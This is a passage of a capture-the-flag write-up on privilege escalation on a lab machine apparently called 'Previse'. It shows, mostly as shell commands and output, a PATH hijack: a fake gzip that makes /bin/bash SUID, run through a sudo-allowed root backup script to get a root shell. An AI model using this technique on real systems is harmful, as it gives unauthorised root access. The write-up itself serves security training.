# Privesc
Privesc is straight forward.
We can run a script as root:

```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$ 
```

Looking at the script we can see that `gzip` is used in an insecure manner (not the full path).

```bash
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

So we can make use of that by exporting the current working directory to the PATH and providing our own `gzip` like:

```bash
m4lwhere@previse:~$ cd /dev/shm/
m4lwhere@previse:/dev/shm$ echo -e '#!/bin/bash\nchmod 4775 /bin/bash'
#!/bin/bash
chmod 4775 /bin/bash
m4lwhere@previse:/dev/shm$ echo -e '#!/bin/bash\nchmod 4775 /bin/bash' > gzip
m4lwhere@previse:/dev/shm$ chmod +x gzip
m4lwhere@previse:/dev/shm$ cat gzip
#!/bin/bash
chmod 4775 /bin/bash
m4lwhere@previse:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:/dev/shm$ export PATH=`pwd`:$PATH
m4lwhere@previse:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:/dev/shm$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
m4lwhere@previse:/dev/shm$ sudo /opt/scripts/access_backup.sh 
m4lwhere@previse:/dev/shm$ ls -la /bin/bash
-rwsrwxr-x 1 root root 1113504 Jun  6  2019 /bin/bash
m4lwhere@previse:/dev/shm$ bash -p
bash-4.4# id
uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere)
bash-4.4# cd /root/
bash-4.4# cat root.txt | wc -c
33
bash-4.4# 
```